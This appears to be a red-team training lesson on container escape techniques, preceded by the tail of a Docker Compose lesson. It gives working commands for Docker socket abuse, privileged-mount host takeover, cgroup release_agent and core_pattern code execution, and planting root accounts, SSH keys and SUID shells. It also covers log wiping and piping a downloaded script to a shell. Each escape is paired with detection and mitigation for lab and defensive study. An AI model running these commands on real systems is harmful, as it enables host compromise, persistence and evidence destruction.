Design a compose file for a deliberately outdated WordPress (wordpress:4.7.5-apache) plus mariadb:10.3, published on 127.0.0.1:8888, on a user-defined subnet of your choice. Add healthchecks to both services. Add an attacker Kali container on the same network. Bring it up, exploit at least one WordPress vulnerability from your host, and take it down cleanly.
18.5 Independent Exercise 2 — Two-Network Pivot Lab

Design a lab with two networks (dmz and internal). Place a vulnerable Tomcat container on both, a vulnerable Redis on internal only, and an attacker on dmz only. Configure networks so the attacker must exploit Tomcat to reach Redis. Verify the isolation by attempting nc -zv <redis-ip> 6379 from the attacker container — it should fail before exploitation and succeed after pivoting.
18.6 Independent Exercise 3 — Layered Overrides

Split a base compose file into docker-compose.yml (services and default ports) and docker-compose.attacker.yml (adds the attacker container and enables NET_ADMIN capability). Confirm that docker compose -f docker-compose.yml up -d starts only targets, and docker compose -f docker-compose.yml -f docker-compose.attacker.yml up -d starts everything. Use docker compose config on both invocations to verify the merged result.
19. Summary and Next Lesson

Compose v2 gives pentesters the tools to build, ship, and tear down reproducible lab environments with a single YAML file and a single command. In this lesson you learned:

    The v1 vs v2 distinction and why docker compose (space) replaces docker-compose (hyphen).
    The current Compose file structure without the deprecated version: key.
    Every important key under services: image vs build, ports, environment, env_file, depends_on with conditions, healthcheck, and restart policies.
    User-defined bridge networks with IPAM, external networks for chaining projects, and the tradeoffs of network_mode: host.
    Named volumes, bind mounts, tmpfs and NFS drivers, and the backup pattern for named volumes.
    Environment substitution rules for ${VAR}, defaults, and required-variable enforcement.
    Profiles for optional attacker and monitoring services.
    Override files, explicit -f merging, and merging semantics.
    Resource limits to contain misbehaving vulnerable containers.
    A minimal DVWA-plus-attacker lab and a multi-tier lab with a segmented internal network.
    Healthchecks that actually verify readiness for Postgres, MySQL, HTTP, and raw TCP.
    Three secret injection strategies from environment variables up to Docker Secrets.
    Cleanup discipline: down -v, pruning, and auditing what is still running.
    Debugging with config, logs, exec, and a nicolaka/netshoot sidecar.
    When Compose stops being enough and Kubernetes starts to make sense.

In the next lesson you will use these skills to build an intentionally vulnerable container image from scratch — writing a Dockerfile that captures real-world misconfigurations (running as root, world-writable directories, embedded secrets, exposed metadata endpoints) and packaging it into a compose file for practice.

Next lesson: Lesson 03 — Dockerfile Deep Dive and Building Vulnerable Images.





























Lesson 03 — Container Security and Escape Techniques

    Module 04: Containers and Software Architecture · Penetration Testing with Kali Linux 1.0 · Red Team Leaders

Introduction

Containers are the default packaging unit of the modern cloud. Every microservice, every CI/CD job, every serverless runtime is ultimately a Linux process wrapped in a set of namespaces and cgroups. This packaging is convenient — it is also, when misconfigured, a straight line from a low-privileged application user to root on the container host. A pentester who understands the container isolation model can turn a single remote-code-execution primitive inside a web application into full control of the underlying node, the Docker daemon, and — in Kubernetes — the entire cluster.

This lesson walks through the enumeration checklist a red-teamer runs immediately after landing inside a container, eight distinct escape families with reproducible lab commands, the detection engineering the blue team uses to catch each family, and hardening measures that keep the escape from working in the first place. Every command in this lesson is written to be executed inside a lab you own — do not run any of these against a container you are not explicitly authorized to test.
1. Introduction and Ethical Scope

All of the techniques in this lesson are documented offensively, but every example is bounded to a lab environment you spin up yourself using the Compose files provided in the walkthrough section, or against a target that is explicitly in scope for an authorized red-team engagement. The reasons for this are legal, practical, and professional:

    Legal. Escaping a container you do not own is unauthorized access under CFAA (US), the Computer Misuse Act (UK), Lei 12.737/2012 (Brazil), and equivalent statutes elsewhere. Container-escape primitives typically cross a tenancy boundary — that boundary is exactly what the law protects.
    Practical. A production container escape can bring down other tenants sharing the same node, corrupt shared volumes, or trigger auto-remediation that pages an on-call at 03:00. Even inside an authorized engagement, escape steps go into the rules of engagement in writing before you run them.
    Professional. The value of a container escape in a report is not the shell — it is the mapped chain from initial foothold to blast radius, with detections and mitigations for each hop. Half the deliverable is the fix path.

    Pentester Insight: The vast majority of container escapes in real engagements come from misconfiguration, not from kernel 0-day. --privileged, a mounted Docker socket, a hostPath volume on /, a container running as UID 0 with CAP_SYS_ADMIN — these are the paying findings. Treat kernel-exploit escapes as the fallback and misconfiguration hunting as the main event.

1.1 Scope Statement Used in This Lesson

Unless otherwise noted, every command in this lesson assumes:

    A Kali or Ubuntu 22.04 attacker workstation.
    A separate lab VM (Ubuntu 22.04, kernel 5.15+, Docker 24.x, containerd 1.7.x) that you own and can rebuild.
    A single-node kind or k3s Kubernetes cluster in the same lab VM for pod-escape examples.
    Snapshots taken before each destructive step so you can roll back.

2. Container Isolation Model Recap

A container is not a lightweight VM. It is one or more Linux processes wearing a costume made of six kernel primitives:
Primitive	What It Isolates	Kernel Feature
PID namespace	Process IDs	CLONE_NEWPID
Mount namespace	Filesystem mounts	CLONE_NEWNS
Network namespace	Interfaces, routes, sockets	CLONE_NEWNET
UTS namespace	Hostname, domain	CLONE_NEWUTS
IPC namespace	System V IPC, POSIX message queues	CLONE_NEWIPC
User namespace	UID/GID mapping	CLONE_NEWUSER
cgroups v2	CPU, memory, I/O quotas	unified_hierarchy
capabilities	Fine-grained root powers	CAP_* bitmask
seccomp	Syscall filter	SECCOMP_MODE_FILTER
LSM (AppArmor/SELinux)	Mandatory access control	LSM hooks

The crucial fact for offensive work is that all of these primitives share one kernel. Container 1's uid 0 and container 2's uid 0 and the host's uid 0 are the same integer inside the same kernel; only the namespace mapping and the capability set decide who can do what with it. If a container has CAP_SYS_ADMIN and can touch a resource outside its mount namespace, root-in-container becomes root-on-host in one hop.
2.1 Blast Radius Consequences
┌─────────────────────────────────────────────────────────┐
│ Host Kernel  (one for everyone)                          │
├───────────────┬───────────────┬────────────────┬────────┤
│ Container A   │ Container B   │ Container C    │  Host  │
│ uid 0 (mapped)│ uid 1000      │ uid 0 privd    │ uid 0  │
│ CAP_NET_BIND  │ (no caps)     │ ALL CAPS       │ ALL    │
│ seccomp on    │ seccomp on    │ seccomp OFF    │ n/a    │
│ apparmor on   │ apparmor on   │ apparmor UNCON │ n/a    │
└───────────────┴───────────────┴────────────────┴────────┘
             │              │              │
             └──────────────┴──────────────┘
                one syscall interface

If you compromise Container C in the diagram above, you effectively already have the host, because the only line between you and the host is a namespace mapping that any of your capabilities can unwind. Compromising Container A or B still requires a real escape (kernel bug, mounted socket, misconfig).
2.2 Runtime Landscape

    runc — the OCI reference runtime, used by Docker and containerd.
    crun — a faster C rewrite of runc, default in Podman and RHEL 9.
    gVisor — a user-space kernel by Google that re-implements Linux syscalls so containers never talk to the host kernel directly.
    Kata Containers — each container is wrapped in a lightweight VM (Firecracker/QEMU) — hardware isolation instead of namespace isolation.
    Firecracker — the microVM AWS Lambda and Fargate use for tenant isolation.

Escapes we cover in this lesson work against runc/crun. gVisor and Kata are covered as mitigations in section 12 — they change the game because the escape target is no longer the host kernel.
3. Enumeration From Inside a Container — The Red-Teamer's First Checklist

The moment you land a shell inside a container (via RCE in the app, an exposed Jupyter, a mispatched Confluence, whatever the initial vector was), you run a fixed sequence of checks before you touch anything else. The point of the checklist is to answer, in under sixty seconds: what is the shortest path from this shell to the host?
3.1 Am I Actually in a Container?
# Signal 1 — cgroup path contains docker/containerd/kubepods:
cat /proc/1/cgroup
# 0::/system.slice/docker-a4c8f7....scope       ← Docker
# 0::/kubepods.slice/kubepods-burstable...       ← Kubernetes
# 0::/                                           ← host or systemd-nspawn

# Signal 2 — /.dockerenv exists (Docker specifically):
ls -la /.dockerenv 2>/dev/null && echo "docker container"

# Signal 3 — init is not systemd:
cat /proc/1/comm
# nginx, node, python — you are containerized
# systemd — probably a full host or a systemd-nspawn container

# Signal 4 — container-specific env vars leaked:
env | grep -iE 'kubernetes|docker|container'
# KUBERNETES_SERVICE_HOST=10.96.0.1    ← inside a Kubernetes pod
3.2 What Capabilities Do I Have?
# Method 1 — capsh (from libcap2-bin), most readable:
capsh --print
# Current: cap_chown,cap_dac_override,cap_fowner,cap_setgid,cap_setuid,
#          cap_net_bind_service,cap_sys_chroot,cap_kill,cap_audit_write=ep
# Bounding set: same as Current
# Ambient set:
# Securebits: 00/0x0/1'b0

# Method 2 — raw bitmask from /proc:
grep -E '^Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status
# CapInh:    0000000000000000
# CapPrm:    00000000a80425fb   ← the meaningful one
# CapEff:    00000000a80425fb
# CapBnd:    00000000a80425fb
# CapAmb:    0000000000000000

# Method 3 — decode the mask by hand or with capsh:
capsh --decode=00000000a80425fb
# 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,...

The masks to memorize:
CapEff Hex	Meaning
0000003fffffffff	ALL capabilities — you are --privileged or effectively so
00000000a80425fb	Docker default set (14 caps)
0000000000000000	Fully dropped (rare, and a good sign of hardening)
Anything containing cap_sys_admin	Likely game over — see Escape 3
Anything containing cap_sys_ptrace + host PID	See Escape 6
cap_sys_module	You can insert a kernel module. Game over.
cap_dac_read_search	Bypass file read DAC — hunt secrets
3.3 What Is Mounted?
# Full mount list:
mount
# overlay on / type overlay (rw,relatime,lowerdir=...)
# /dev/sda1 on /etc/hosts type ext4 (rw,relatime)          ← HOST DEVICE INSIDE CONTAINER
# tmpfs on /run/docker.sock type tmpfs                     ← socket path
# /var/run/docker.sock                                     ← DOCKER SOCKET MOUNTED

# Same view from /proc — works even if `mount` binary is missing:
cat /proc/mounts

# Look for red-flag mounts:
mount | grep -E 'docker.sock|/proc$|/sys$|/dev$|/host|/root'

Red-flag mounts to hunt for:

    docker.sock mounted anywhere → Escape 1
    / or any host root path mounted → Escape 5
    /var/log, /etc/shadow, /root/.ssh, /proc, /sys from host → data theft or Escape 5
    /dev from host with block devices → Escape 2 primitive even without --privileged
    Kubernetes hostPath volumes → same as above under a different name

3.4 Is the Docker Socket Mounted?
# The single most productive check in container pentesting:
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null
# srw-rw---- 1 root docker 0 Nov 12 10:11 /var/run/docker.sock

# Confirm it talks to a live daemon:
curl --unix-socket /var/run/docker.sock http://localhost/version
# {"Platform":{"Name":"Docker Engine - Community"}, ...}

If the answer is yes, skip to Escape 1 — the game is over.
3.5 Am I Privileged?

You almost never see --privileged in /proc/self/status, but you can prove it by attempting operations that only a privileged container can perform:
# Test 1 — create a new network interface:
ip link add dummy0 type dummy && ip link del dummy0 && echo "PRIVILEGED (CAP_NET_ADMIN)"

# Test 2 — write to /proc/sysrq-trigger (only privileged can):
echo 1 > /proc/sysrq-trigger 2>&1 | head -1
# bash: /proc/sysrq-trigger: Permission denied     ← not privileged
# (silent success)                                 ← PRIVILEGED

# Test 3 — access /dev/mem or block devices:
ls /dev/sda* /dev/nvme0n1* /dev/mem 2>/dev/null
# /dev/sda /dev/sda1 /dev/sda2                     ← PRIVILEGED

# Test 4 — mount inside the container:
mkdir /tmp/x && mount -t tmpfs none /tmp/x && umount /tmp/x && echo "CAP_SYS_ADMIN"
3.6 Automated Tooling

Three tools do the entire checklist for you and produce a triageable report:
# linpeas (linux privilege escalation swiss army knife, with container checks):
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Look for the "Container" and "Escape" sections at the top of the report.

# deepce (Docker enumeration and container escapes):
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh -e            # -e also attempts safe escapes and reports which worked

# amicontained (Jess Frazelle) — capability and syscall probe:
curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64
chmod +x amicontained
./amicontained
# Container Runtime: docker
# Has Namespaces:
#   pid: true
#   user: false
# AppArmor Profile: docker-default (enforce)
# Capabilities:
#   BOUNDING -> chown dac_override fowner ... sys_admin ...
# Seccomp: disabled

An amicontained output showing sys_admin in the bounding set, seccomp: disabled, and user: false is the signature of a container that is ripe for escape.
4. Escape 1 — Mounted Docker Socket

Precondition: /var/run/docker.sock (or any other path bound to the host's Docker socket) is mounted inside the container and the shell user can read/write it. Common in CI systems, Portainer, monitoring agents that "just need to see containers."

Idea: The Docker socket is an unauthenticated root-equivalent API. If you can talk to it, you can ask the daemon to launch a new container that mounts the host filesystem, then chroot into that mount.
4.1 Lab Setup (Authorized)
# On the lab VM you own, spin up a deliberately vulnerable container:
docker run -d --name sock-victim \
    -v /var/run/docker.sock:/var/run/docker.sock \
    alpine sleep infinity

# Enter it as an unprivileged user simulation:
docker exec -it sock-victim sh
4.2 The Escape
# Inside the container:
apk add --no-cache docker-cli >/dev/null

# Launch a new container that mounts host / at /host, then chroot in:
docker -H unix:///var/run/docker.sock run --rm -it \
    -v /:/host \
    alpine chroot /host sh

# You are now a root shell in the host mount namespace.
# Prove it:
cat /etc/hostname            # host's hostname, not the container's
ls /root/.ssh                # host's root SSH keys
4.3 Detection

    Falco: rule Launch Privileged Container and Container Started with Sensitive Mount (built-in) both fire when the escape container is created with -v /:/host.
    auditd: -w /var/run/docker.sock -p rwa -k docker_socket_access catches any process opening the socket that is not dockerd itself.
    EDR: CrowdStrike, SentinelOne, and Defender for Endpoint ship rules that alert on chroot inside a process whose parent is dockerd and whose mount source is /.

4.4 Mitigation

    Never mount the Docker socket into an application container. If a workload truly needs to launch containers, use the rootless daemon, socket-activated podman.socket, or Kubernetes with proper RBAC.
    If you must expose the socket, put it behind a socket-proxy (Tecnativa docker-socket-proxy) that filters allowed API endpoints (typically /containers/json only).

5. Escape 2 — --privileged Container

Precondition: The container was started with --privileged, giving it every capability, no seccomp, no AppArmor, and access to all host devices via /dev.

Idea: With direct access to /dev/sda1 (or the host root block device), you mount the host filesystem inside your container and read/write it.
5.1 Lab Setup
docker run --rm -it --privileged --name priv-victim alpine sh
5.2 The Escape
# Inside the privileged container:
fdisk -l                                 # enumerate host disks
# Disk /dev/sda: 40 GiB, ...
# /dev/sda1  *  2048 83884031 83881984 40G 83 Linux

mkdir /mnt/host
mount /dev/sda1 /mnt/host

ls /mnt/host                             # host filesystem
cat /mnt/host/etc/shadow                 # host password hashes
echo 'attacker:x:0:0::/root:/bin/bash' >> /mnt/host/etc/passwd
echo 'attacker::0:0:99999:7:::'          >> /mnt/host/etc/shadow

# Or drop an authorized_keys file for persistence on the host:
mkdir -p /mnt/host/root/.ssh
echo "ssh-ed25519 AAAA...attacker" >> /mnt/host/root/.ssh/authorized_keys
5.3 Detection

    Falco: rules Mount Launched in Privileged Container and Write below root fire immediately.
    auditd: -a always,exit -F arch=b64 -S mount -k container_mount catches the mount syscall from any process inside a Docker cgroup.
    EDR: flagged as "host filesystem tampering from container" behavior.

5.4 Mitigation

    Ban --privileged in the org's admission controller (Kyverno/Gatekeeper, or a simple Docker socket proxy filter).
    Where --privileged is unavoidable (some CI runners), pin it to a dedicated node pool with no shared secrets and no persistent data.

6. Escape 3 — CAP_SYS_ADMIN via release_agent cgroup notify_on_release Trick

Precondition: The container has CAP_SYS_ADMIN (present in --privileged, and sometimes granted individually by CI or storage-provisioner sidecars) and cgroup v1 is enabled on the host (the trick is largely defused on pure cgroup v2 systems; Ubuntu 22.04 is v2 by default but many kubernetes distros still ship v1).

Idea: CAP_SYS_ADMIN lets us mount cgroup filesystems inside the container. When the last task in a cgroup exits, the kernel executes the program named in that cgroup hierarchy's release_agent file as root on the host, outside any namespace. We control both release_agent and the task exit — so we get arbitrary host-side code execution.
6.1 Concept
┌────────────────────────────────────────────────────────────┐
│ Container (CAP_SYS_ADMIN)                                  │
│                                                            │
│  1. mount -t cgroup -o rdma cgroup /tmp/cgrp               │
│  2. mkdir /tmp/cgrp/x                                      │
│  3. echo 1 > /tmp/cgrp/x/notify_on_release                 │
│  4. echo /cmd > /tmp/cgrp/release_agent   ← runs on HOST   │
│  5. sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs; exit"       │
│                                                            │
│  last task in /tmp/cgrp/x exits → kernel runs /cmd on host │
└────────────────────────────────────────────────────────────┘

The path in release_agent is resolved in the host's root mount namespace, but we can point it at a script that lives on the overlay filesystem of our container — because the overlay's upper directory is a real path on the host.
6.2 Lab PoC
# Lab container (you own it):
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined \
    --name cgroup-victim alpine sh

# Inside the container:
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # any v1 controller you can find
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# Discover the host path of our overlay upperdir:
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
# If mtab does not have it, read /proc/self/mountinfo instead:
host_path=$(grep -oP 'upperdir=\K[^,]+' /proc/self/mountinfo | head -1)

# Payload we want to run on the host:
cat > /cmd <<'EOF'
#!/bin/sh
ps -ef > /output
id >> /output
cat /etc/shadow >> /output
EOF
chmod +x /cmd

# Point release_agent at our /cmd — using the HOST view of that path:
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Trigger it — write our PID into the cgroup, then exit that shell:
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# The kernel runs $host_path/cmd as root on the host.
# The output landed in the container's / because that path is our overlay upperdir:
cat /output
6.3 Detection

    Falco: rule Detect release_agent File Container Escapes (community rules) — pattern open_write on any file ending in release_agent from a container cgroup.
    auditd: -w /sys/fs/cgroup -p wa -k cgroup_write will surface the mount and the write.
    Tracee / Tetragon (eBPF): built-in signatures for cgroup release_agent abuse — reliable and low false positive.

6.4 Mitigation

    Move to cgroup v2 (the release_agent mechanism does not exist there).
    Drop CAP_SYS_ADMIN from containers that do not truly need it.
    Keep the default AppArmor / SELinux profile enabled — docker-default blocks the mount.

7. Escape 4 — Writable /proc/sys/kernel/core_pattern

Precondition: /proc is mounted from the host (not the container's own procfs) and is writable, or the container is --privileged. Any process crash in any PID namespace that shares the sysctl triggers the pattern.

Idea: When a process dumps core, the kernel invokes the program named in /proc/sys/kernel/core_pattern (prefixed with |) as root on the host to receive the core. If we control that value and can crash a process, we get host code execution.
7.1 Lab PoC
# In a privileged / host-proc container:
cat /proc/sys/kernel/core_pattern
# |/usr/share/apport/apport %p %s %c   ← original

# Find the overlay upperdir as before, then:
cat > /handler.sh <<EOF
#!/bin/sh
id > /tmp/pwned
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /handler.sh

echo "|$host_path/handler.sh" > /proc/sys/kernel/core_pattern

# Trigger a crash — any segfault works:
sleep 60 &
kill -SIGSEGV $!

# Result: /handler.sh runs on the host as root, drops a SUID root bash into /tmp.
7.2 Detection

    Falco: rule Write below /proc catches the sysctl write from inside a container.
    auditd: -w /proc/sys/kernel/core_pattern -p wa -k core_pattern_write.
    Sysmon for Linux: File create / modify events on /proc/sys/kernel/core_pattern are high signal.

7.3 Mitigation

    Never mount /proc from the host into a container. The masked procfs Docker mounts by default is not writable and hides core_pattern.
    Enforce the default seccomp profile, which blocks the syscalls needed to reset masked mounts.

8. Escape 5 — Mounted Host Paths

Precondition: The container has -v /some/host/path:/inside for a sensitive /some/host/path. Common patterns:

    -v /etc/shadow:/etc/shadow:ro (careless "share the users" pattern)
    -v /root/.ssh:/root/.ssh (build container with author's keys)
    -v /var/log:/var/log (log aggregators)
    -v /var/lib/docker:/var/lib/docker (dind style, gives you every other container's layers)
    Kubernetes hostPath: { path: / } (game over on that node)

8.1 What You Do With It
# Case A — /etc/shadow read-only mount:
cat /etc/shadow > /tmp/shadow.copy   # crack offline with john / hashcat
# john --wordlist=rockyou.txt /tmp/shadow.copy

# Case B — /root/.ssh mounted read-write:
echo "ssh-ed25519 AAAA...attacker" >> /root/.ssh/authorized_keys
# then ssh root@host from the attacker box

# Case C — /var/log mounted read-write, log tampering:
# Overwrite auth.log to erase evidence of the initial foothold.
truncate -s 0 /var/log/auth.log

# Case D — /var/lib/docker read-write:
# You can now read the contents of every other container's layers,
# including secrets baked into them, environment files, and DB volumes.
find /var/lib/docker -name '.env' -o -name '*.key' 2>/dev/null
8.2 Detection

    Falco: Read sensitive file untrusted (matches /etc/shadow read from a container) and Write below root (any container writing under /root/).
    auditd: file watches on /etc/shadow, /root/.ssh, /var/log.
    osquery / Fleet: periodic docker_container_mounts query with an allowlist.

8.3 Mitigation

    Enforce a bind-mount allowlist in your admission controller.
    Use read-only mounts (:ro) wherever the container does not need to write.
    Prefer named volumes over host paths whenever possible.

9. Escape 6 — Kubernetes Pod with hostPID: true or hostNetwork: true

Precondition: A pod in the target cluster was scheduled with hostPID: true, hostNetwork: true, or hostIPC: true. Often paired with privileged: true. Very common in DaemonSets shipped by observability, storage, and CNI vendors — those DaemonSets are prime targets.

Idea: With hostPID: true, your container sees every process on the host in its own /proc. Combined with CAP_SYS_ADMIN (or --privileged), nsenter lets you jump into the mount and PID namespaces of PID 1 (usually systemd or a kubelet-managed init), effectively giving you a shell on the node.
9.1 Lab Pod
# escape-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: shell
    image: alpine
    command: ["sleep", "infinity"]
    securityContext:
      privileged: true kubectl apply -f escape-pod.yaml
kubectl exec -it escape-pod -- sh
9.2 The Escape
# Inside the pod:
apk add --no-cache util-linux    # nsenter is in util-linux

# Jump into every namespace of PID 1 on the host:
nsenter -t 1 -m -u -i -n -p -- /bin/bash

# You are now root on the node.
hostname                  # node's hostname
cat /etc/kubernetes/admin.conf 2>/dev/null || cat /var/lib/kubelet/kubeconfig
# Anything the node can do, you can do. On a control-plane node, that is the whole cluster.

Without --privileged but with hostPID: true, you can still enumerate host processes and read /proc/<pid>/environ for every host process — which leaks secrets, kubelet tokens, database URLs, and everything else that was passed as an env var to any process on the node.
9.3 Detection

    Falco: Launch Privileged Container, Launch Sensitive Mount Container, and Namespace Change (setns) by Unknown Process all fire on the nsenter step.
    Kubernetes audit log: admission of any pod with hostPID: true or privileged: true is a high-signal event — Kyverno/OPA policies should block it, and the audit trail should alert.
    Falco k8s-audit: rules Create HostNetwork Pod and Create Privileged Pod ship in the default ruleset.

9.4 Mitigation

    Enforce Pod Security Standards at the restricted level in every namespace that does not need a specific exception.
    Use Kyverno / OPA Gatekeeper policies to reject hostPID, hostNetwork, hostIPC, privileged, hostPath, and capabilities.add outside a very small allowlist.
    Segregate DaemonSets that genuinely need host access onto dedicated node pools and set network policies to isolate them.

10. Escape 7 — Kernel Exploits (Lab-Only)

Kernel vulnerabilities are the fallback path when the misconfiguration checklist comes back empty. They are also the reason distros patch the kernel monthly. Use these only against a lab kernel you booted specifically to test the exploit.
10.1 CVE-2022-0492 — cgroups v1 release_agent Without CAP_SYS_ADMIN

    Kernel: < 5.16.14 without the fix backport.
    Idea: The release_agent write did not check namespace ownership. A container without CAP_SYS_ADMIN in the initial user namespace could still write to release_agent when combined with an unprivileged user namespace — providing the same escape as Section 6.
    Reference PoC: chompie1337/Linux_LPE_Chompie and Unit 42's writeup (walk through in the lab VM, not in production).
    Mitigation: upgrade kernel; run on cgroup v2; disable unprivileged user namespaces where possible (sysctl kernel.unprivileged_userns_clone=0).

10.2 CVE-2022-0847 — Dirty Pipe

    Kernel: 5.8 through 5.16.11 / 5.15.25 / 5.10.102.
    Idea: A flaw in the pipe subsystem lets an unprivileged user overwrite pages of read-only files, including SUID binaries and container image layers. From inside a container, this can be used to overwrite the runc binary on the host, giving you code execution the next time any container is launched.
    Reference PoC: Arinerron/CVE-2022-0847-DirtyPipe-Exploit.
    Mitigation: patch the kernel — there is no meaningful workaround.

10.3 CVE-2019-5736 — runc Host Binary Overwrite (Historical)

    Runtime: runc < 1.0-rc7.
    Idea: When a container exec'd into a compromised image, the exec descriptor /proc/self/exe could be overwritten to point at attacker code, which then replaced the host runc binary.
    Mitigation: patched runc versions ship a memfd-based mitigation. Verify with runc --version.

10.4 Detection

    Kernel exploits are hard to catch on the syscall surface itself. Detect the outcome: file integrity monitoring on /usr/bin/runc, /usr/sbin/*, /etc/passwd, /etc/shadow; EDR alerts on new SUID binaries; osquery file_events on paths under /usr and /etc.
    Falco rule Modify binary dirs catches the Dirty Pipe outcome on runc.

11. Escape 8 — Docker Socket via Raw API

Same precondition as Escape 1, but with no docker binary installed. curl and the daemon's HTTP-over-Unix API are enough.
11.1 Enumerate
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock http://localhost/images/json
11.2 Create a Container That Mounts Host /
curl --unix-socket /var/run/docker.sock \
     -X POST http://localhost/containers/create?name=pwn \
     -H 'Content-Type: application/json' \
     -d '{
       "Image": "alpine",
       "Cmd": ["/bin/sh","-c","cp /bin/sh /host/tmp/rootsh && chmod +s /host/tmp/rootsh"],
       "HostConfig": {"Binds":["/:/host"]}
     }'
11.3 Start It, Then Use the SUID Shell
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/pwn/start
# On the host, /tmp/rootsh is now a setuid-root shell.
11.4 Detection

Same detections as Escape 1 — the daemon logs the container create either way, and Falco / auditd fire on the socket write and on the resulting container's suspicious mount.
12. Detection and Mitigation Overview
12.1 Runtime Sandboxes
Layer	Product	What Changes
Syscall interposition	gVisor (runsc)	Containers talk to a user-space Sentry that reimplements Linux syscalls. Kernel exploits against the host kernel are out of reach.
Micro-VM	Kata Containers	Each pod runs in a lightweight VM (Firecracker/QEMU/Cloud Hypervisor). Escape must break out of the guest kernel and the hypervisor.
Micro-VM	Firecracker	Same idea, used by AWS Lambda/Fargate.
MAC	AppArmor docker-default	Blocks mount, ptrace, and many /proc writes even inside --privileged.
MAC	SELinux container_t	Similar in RHEL / OpenShift.
12.2 Runtime Detection Stack

    Falco — the default runtime-security tool for Kubernetes. Ships rules for every escape family in this lesson. Deploy as a DaemonSet, send alerts to Falcosidekick → SIEM.
    Tetragon (Cilium) — eBPF-based, catches namespace transitions, capability changes, and file writes at the kernel event level.
    Tracee (Aqua) — eBPF signature engine with named rules for each CVE-based escape.
    auditd — the classic. Slower and noisier, but universal. File watches on /proc/sys/kernel/core_pattern, /var/run/docker.sock, /sys/fs/cgroup/*/release_agent.

12.3 Container Runtime Flags That Kill Most Escapes
# Baseline hardening you should apply to every container:
docker run \
    --user 1000:1000 \                    # non-root inside
    --read-only \                          # rootfs is immutable
    --cap-drop=ALL \                       # start from zero caps
    --cap-add=NET_BIND_SERVICE \           # add only what you need
    --security-opt=no-new-privileges \     # blocks setuid escalation
    --security-opt=seccomp=default.json \  # keep the default seccomp
    --pids-limit=100 \                     # fork-bomb protection
    --tmpfs /tmp:rw,noexec,nosuid,size=64m \
    myimage:tag
12.4 Rootless Docker / Podman

Rootless mode runs the daemon (or, for Podman, no daemon at all) as an unprivileged user, so a container escape lands you in an unprivileged UID on the host rather than root. It changes the blast radius from "own the node" to "own that one user's files."
13. Runtime Image Hardening

The escape surface starts at build time. A hardened image gives the runtime much less to work with.
13.1 Distroless Base Images
# BAD — full Debian, hundreds of binaries the attacker can use:
FROM debian:12
COPY app /app
CMD ["/app"]

# GOOD — distroless: only the app and its runtime dependencies:
FROM gcr.io/distroless/base-debian12:nonroot
COPY app /app
USER nonroot
ENTRYPOINT ["/app"]

Distroless images have no shell, no package manager, no curl, no wget. An attacker with RCE has to bring their own tools — every enumeration command in Section 3 fails because the binaries do not exist.
13.2 Non-Root USER
# Create a dedicated user in the image build:
RUN groupadd -r app && useradd -r -g app -u 10001 app
USER 10001:10001

Running as UID 0 inside a container is the second-largest amplifier of blast radius after --privileged. UID 10001 with --cap-drop=ALL has almost no attack surface into the kernel.
13.3 Read-Only Root Filesystem
# Kubernetes:
securityContext:
  readOnlyRootFilesystem: true
volumeMounts:
  - name: tmp
    mountPath: /tmp
volumes:
  - name: tmp
    emptyDir: {}

A read-only rootfs means an attacker cannot drop a webshell, cannot install a package, cannot modify /etc/passwd. Combined with no-new-privileges, most persistence primitives disappear.
13.4 Minimal Capability Set

Start with --cap-drop=ALL and add back only what the workload proves it needs:
Workload	Typical Add	Reasoning
HTTP server on port 80/443	NET_BIND_SERVICE	Bind low port as non-root
tcpdump / packet capture	NET_ADMIN, NET_RAW	Raw sockets
Ping	NET_RAW	ICMP raw sockets
Change file ownership at start	CHOWN, FOWNER	Init step only — consider running as root once then dropping
Most application containers	(none)	Do not need any of these
14. Container Security Scanners

Detect vulnerable images and misconfigured Dockerfiles before they ever hit production.
14.1 Trivy
# Scan an image for known CVEs:
trivy image myapp:1.2.3

# Scan a filesystem or repo for secrets and misconfigs:
trivy fs .

# Scan a Kubernetes cluster:
trivy k8s --report summary cluster
14.2 Grype + Syft
# Generate an SBOM (Software Bill of Materials):
syft myapp:1.2.3 -o spdx-json > sbom.json

# Scan the SBOM for CVEs:
grype sbom:./sbom.json
14.3 docker scan / docker scout
docker scout cves myapp:1.2.3
docker scout recommendations myapp:1.2.3
14.4 Dockerfile Linting
# hadolint — Dockerfile best-practice linter:
hadolint Dockerfile
# DL3002 warning: Last USER should not be root
# DL3020 error: Use COPY instead of ADD for files and folders

# checkov — IaC scanner that also handles Dockerfiles and Kubernetes YAML:
checkov -f Dockerfile
checkov -d ./k8s/
14.5 Wire Scanners Into CI

The scan is only useful if it fails the build. In a GitHub Actions or GitLab CI pipeline, add:
- name: Trivy image scan
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: '${{ steps.build.outputs.image }}'
    severity: 'HIGH,CRITICAL'
    exit-code: '1'
15. Full Walkthrough Lab — From Privileged Container to Host Root, Then Blocked

This is the exercise you run end-to-end on your lab VM.
15.1 Lab Prerequisites
# On a fresh Ubuntu 22.04 lab VM you own:
sudo apt update
sudo apt install -y docker.io docker-compose-v2 auditd git
sudo usermod -aG docker $USER
newgrp docker

# Verify:
docker version
docker compose version
15.2 Vulnerable Compose

Save as ~/escape-lab/docker-compose.yml:
services:
  vulnerable:
    image: alpine:3.19
    container_name: vuln-priv
    privileged: true              # <-- the vulnerable knob
    command: sleep infinity
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock   # bonus escape primitive

Bring it up:
